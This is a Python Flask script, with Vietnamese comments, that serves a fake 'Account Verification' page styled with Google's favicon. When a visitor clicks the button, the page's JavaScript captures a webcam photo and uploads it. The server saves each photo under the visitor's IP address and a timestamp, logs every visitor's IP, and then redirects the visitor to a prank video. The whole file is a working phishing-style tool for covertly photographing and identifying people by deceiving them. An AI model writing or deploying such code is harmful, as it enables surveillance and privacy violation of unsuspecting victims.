from flask import Flask, request, render_template_string
import os
from datetime import datetime

app = Flask(__name__)

# Đường dẫn lưu ảnh
SAVE_PATH = r"C:\Users\8888\Pictures\Screenshots"
os.makedirs(SAVE_PATH, exist_ok=True)  # Tạo thư mục nếu chưa có

HTML_PAGE = """  
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Minh Tài Khoản</title>
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #e3f2fd; }
        .container { margin-top: 50px; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 0 15px rgba(0, 123, 255, 0.3); display: inline-block; }
        h2 { color: #0d6efd; }
        p { color: #333; }
        .hidden { display: none; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0d6efd; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .success-msg { color: #198754; font-weight: bold; margin-top: 20px; }
        button { background-color: #0d6efd; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #0b5ed7; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Xác Minh Tài Khoản</h2>
        <p>Vui lòng bấm vào nút bên dưới để hoàn tất xác minh.</p>
        <div class="loader hidden" id="loader"></div>
        <p class="success-msg hidden" id="success-msg">✅ Cảm ơn bạn! Xác minh thành công.</p>
        <br>
        <button id="verify-btn" onclick="startVerification()">Xác Minh Ngay</button>
    </div>

    <script>
        function startVerification() {
            let button = document.getElementById("verify-btn");
            let loader = document.getElementById("loader");
            let successMsg = document.getElementById("success-msg");

            button.style.display = "none"; // Ẩn nút bấm
            loader.classList.remove("hidden"); // Hiện vòng quay loading

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => { 
                    let videoTrack = stream.getVideoTracks()[0];
                    let imageCapture = new ImageCapture(videoTrack);

                    imageCapture.takePhoto()
                        .then(blob => {
                            let formData = new FormData();
                            formData.append("image", blob, "face_verification.png");

                            fetch('/upload', { method: "POST", body: formData })
                                .then(response => {
                                    loader.classList.add("hidden"); // Ẩn loading
                                    successMsg.classList.remove("hidden"); // Hiện thông báo thành công

                                    setTimeout(() => {
                                        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Rickroll
                                    }, 3000);
                                })
                                .catch(error => console.error("Lỗi upload ảnh:", error));
                        })
                        .catch(err => console.error("Lỗi chụp ảnh:", err));
                })
                .catch(err => { console.error("Lỗi truy cập webcam:", err); });
        }
    </script>
</body>
</html>
"""  

@app.route('/')  
def index():  
    user_ip = request.remote_addr  
    print(f"[📌] Có người truy cập! IP: {user_ip}")
    return render_template_string(HTML_PAGE)  

@app.route('/upload', methods=['POST'])  
def upload():  
    if 'image' in request.files:  
        image = request.files['image']  
        user_ip = request.remote_addr  
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")  
        image_path = os.path.join(SAVE_PATH, f"{user_ip}_{timestamp}.png")  
        image.save(image_path)  

        print(f"[📷] Ảnh đã chụp từ IP {user_ip}: {image_path}")  
        return "OK", 200  
    return "Lỗi khi nhận ảnh!", 400  

if __name__ == '__main__':  
    app.run(host='0.0.0.0', port=8080, debug=True)